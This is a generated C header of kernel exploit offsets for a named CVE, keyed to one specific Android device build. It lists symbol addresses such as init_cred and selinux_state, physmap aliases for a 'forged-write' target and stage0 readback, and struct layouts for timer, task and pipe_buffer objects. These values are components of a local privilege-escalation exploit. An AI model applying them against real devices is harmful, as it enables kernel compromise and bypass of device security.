/* CVE-2026-64560 offsets -- GENERATED, do not edit by hand.
 * device panther build CP2A.260705.006
 * kernel 6.1.157-android14-11-gbd23337e42e7-ab14791245
 * SPL    2026-07-05
 * source live kallsyms + BTF, captured 2026-08-31T21:02:55+02:00
 *        _text(runtime)=0xffffffdbc3a00000
 * regenerate: runner/scripts/gen-cve64560-offsets.py data/live/panther-CP2A.260705.006
 */
#pragma once

#define KIMAGE_TEXT_BASE UINT64_C(0xffffffc008000000)
#define LINK_IMAGE_BASE  UINT64_C(0xffffffc008000000)
#define PAGE_OFFSET_VA   UINT64_C(0xffffff8000000000)

/* ---- kernel symbols (link-time addresses, keyed to this build) ---- */
#define LINK_INIT_TASK                   UINT64_C(0xffffffc00a01f640)
#define LINK_INIT_CRED                   UINT64_C(0xffffffc00a031aa8)
#define LINK_SELINUX_STATE               UINT64_C(0xffffffc00a25a420)
#define LINK_SELINUX_BLOB_SIZES          UINT64_C(0xffffffc0095ceb88)
#define LINK_KMALLOC_CACHES              UINT64_C(0xffffffc0095cdfb8)
#define LINK_ANON_PIPE_BUF_OPS           UINT64_C(0xffffffc009109910)
#define LINK_ASHMEM_IOCTL                UINT64_C(0xffffffc008c38d28)
#define LINK_ASHMEM_OPEN                 UINT64_C(0xffffffc008c398d8)
#define LINK_ASHMEM_RELEASE              UINT64_C(0xffffffc008c39960)
#define LINK_CONFIGFS_READ_ITER          UINT64_C(0xffffffc008464400)
#define LINK_CONFIGFS_BIN_WRITE_ITER     UINT64_C(0xffffffc008464930)
#define LINK_MEMSTART_ADDR               UINT64_C(0xffffffc0095cdcc0)
#define LINK_KIMAGE_VOFFSET              UINT64_C(0xffffffc0095cdd68)
#define LINK_MODULE_DIRECT_BASE          UINT64_C(0xffffffc0095cdcb8)
#define LINK_MISC_LIST                   UINT64_C(0xffffffc00a137e00)
#define LINK_UHID_MISC                   UINT64_C(0xffffffc00a176400)
#define LINK_UHID_FOPS                   UINT64_C(0xffffffc0092728c0)
#define LINK_SYSCTL_BOOTID               UINT64_C(0xffffffc00a27b498)
#define LINK_RANDOM_TABLE                UINT64_C(0xffffffc00a137c00)
#define LINK_NFULNL_LOGGER               UINT64_C(0xffffffc00a0129d0)
#define LINK_SDATA                       UINT64_C(0xffffffc00a000000)
#define LINK_END                         UINT64_C(0xffffffc00a1fba00)

/* ---- physmap aliases ---- */

/* ---- forged-write parent: &random_table[boot_id] ---- */
/* random_table[4] == boot_id; .data at +0x8 */
#define DIRECT_BOOTID_PARENT             UINT64_C(0xffffff8002137d00)
#define DIRECT_BOOTID_DATA               UINT64_C(0xffffff8002137d08)

/* ---- stage0 readback landmark (2-element list cycle) ---- */
#define LINK_CYCLE_C                     UINT64_C(0xffffffc00a01fd30)
#define DIRECT_CYCLE_C                   UINT64_C(0xffffff800201fd30)
#define LINK_CYCLE_D                     UINT64_C(0xffffffc00a01e990)
#define DIRECT_CYCLE_D                   UINT64_C(0xffffff800201e990)

/* ---- struct layouts (BTF, exact for this image) ---- */
#define KITIMER_SIZE                     0x0108
#define KITIMER_LIST_OFF                 0x0000
#define KITIMER_IT_LOCK_OFF              0x0020
#define KITIMER_IT_CLOCK_OFF             0x0030
#define KITIMER_IT_ID_OFF                0x0034
#define KITIMER_IT_ACTIVE_OFF            0x0038
#define KITIMER_IT_SIGNAL_OFF            0x0060
#define KITIMER_SIGQ_OFF                 0x0070
#define KITIMER_IT_UNION_OFF             0x0078
#define KITIMER_RCU_OFF                  0x00f8
#define CPU_TIMER_SIZE                   0x0050
#define CPU_TIMER_NODE_OFF               0x0000
#define CPU_TIMER_HEAD_OFF               0x0020
#define CPU_TIMER_PID_OFF                0x0028
#define CPU_TIMER_ELIST_OFF              0x0030
#define CPU_TIMER_FIRING_OFF             0x0040
#define TQ_NODE_SIZE                     0x0020
#define TQ_NODE_RB_OFF                   0x0000
#define TQ_NODE_EXPIRES_OFF              0x0018
#define TQ_HEAD_SIZE                     0x0010
#define TASK_SIGHAND_OFF                 0x0898
#define TASK_SIGNAL_OFF                  0x0890
#define TASK_CRED_OFF                    0x0838
#define TASK_TASKS_OFF                   0x0550
#define TASK_PID_OFF                     0x0630
#define TASK_TGID_OFF                    0x0634
#define SIGNAL_POSIX_CPUTIMERS_OFF       0x0120
#define PIPE_BUFFER_SIZE                 0x0028
#define PIPE_BUFFER_PAGE_OFF             0x0000
#define PIPE_BUFFER_OPS_OFF              0x0010
#define PIPE_BUFFER_FLAGS_OFF            0x0018
